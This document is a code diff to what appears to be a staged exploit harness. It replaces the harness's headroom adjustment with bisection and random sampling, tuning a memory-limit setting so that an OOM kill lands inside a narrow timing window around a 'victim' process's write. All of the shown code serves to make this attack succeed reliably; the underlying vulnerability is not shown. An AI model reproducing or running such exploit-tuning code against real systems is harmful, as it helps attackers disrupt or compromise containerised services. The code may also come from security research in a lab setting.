@@ -23,6 +23,7 @@ reconstructed R, then adjust headroom by (k_target - k).
 from __future__ import annotations
 
 import os
+import random
 import re
 import socket
 import sys
@@ -284,6 +285,12 @@ def _main() -> int:
           f"initial headroom={headroom}")
 
     calibrated = False
+    lo, hi = 2_000_000, CALIB_HEADROOM   # bracket on the headroom
+    signal = None                        # "low" = band above | "high" = below
+    MIN_W = 2_000_000                    # k-window width in headroom units:
+                                         # never sample narrower - the
+                                         # baseline jitters ~1-2MiB between
+                                         # attempts and slides the window
     for i in range(1, MAX_ATTEMPTS + 1):
         # first pass: calibration attempt with a huge limit (no OOM), used
         # to measure the victim's real transient charge from the trace.
@@ -306,6 +313,10 @@ def _main() -> int:
             if 0 < x_pwrite < CALIB_HEADROOM:
                 headroom = x_pwrite + K_TARGET + 100_000
                 calibrated = True
+                # the calibration lands at the nominal center; start a
+                # bracket around it for the refinement below
+                lo = max(2_000_000, headroom - 4_000_000)
+                hi = headroom + 4_000_000
                 print(f"[*] calibrated: trace_max={res['trace_max']} "
                       f"|R|={rl} X_pwrite={x_pwrite} "
                       f"-> headroom={headroom}")
@@ -313,14 +324,45 @@ def _main() -> int:
 
         outcome = res.get("outcome")
         k = res.get("k")
+        f_off, e_off = lab.f_offset(), lab.e_offset()
         if outcome == "container-died":
-            headroom += K_TARGET // 2          # master was selected: back off
-        elif k is not None and outcome in ("early", "mix", "late"):
+            # master was selected: back off with more headroom
+            lo = max(lo, headroom)
+            signal = "low"
+        elif k is not None and f_off <= k < e_off:
+            # inside the window without a hit (probe hiccup): the
+            # proportional correction is still the right nudge
             headroom += (K_TARGET - k)
-        elif outcome in ("no-carrier", "unknown", "empty"):
-            headroom += K_TARGET // 2
-        else:
-            headroom += K_TARGET // 2
+            signal = None
+        elif outcome == "early" or (k is not None and k < f_off):
+            # crossed before the write: headroom too low - band is above
+            lo = max(lo, headroom)
+            signal = "low"
+        elif outcome in ("late", "nooom") or (k is not None and k >= e_off):
+            # crossed too late / never: headroom too high - band below
+            hi = min(hi, headroom)
+            signal = "high"
+        # noise (no-carrier/unknown/empty): no signal, hold everything
+
+        if signal is not None:
+            # a collapsed bracket slides toward the last signal instead of
+            # freezing: the early/late flip is stochastic (baseline
+            # jitter), so point convergence oscillates between the band's
+            # edges - exactly the 12.4M/13.4M two-cycle seen on CI
+            if hi - lo < MIN_W:
+                if signal == "low":
+                    lo = max(lo, headroom)
+                    hi = lo + MIN_W
+                else:
+                    hi = min(hi, headroom)
+                    lo = max(2_000_000, hi - MIN_W)
+            # coarse bisection to find the band, then sample it: the mix
+            # outcome is stochastic inside the band, walking it beats
+            # converging to a point
+            if hi - lo >= MIN_W * 2:
+                headroom = (lo + hi) // 2
+            else:
+                headroom = random.randint(int(lo), int(hi))
         headroom = max(headroom, 2_000_000)
 
     print("\n=== STAGE2 RESULT: FAIL (no hit within attempts) ===")
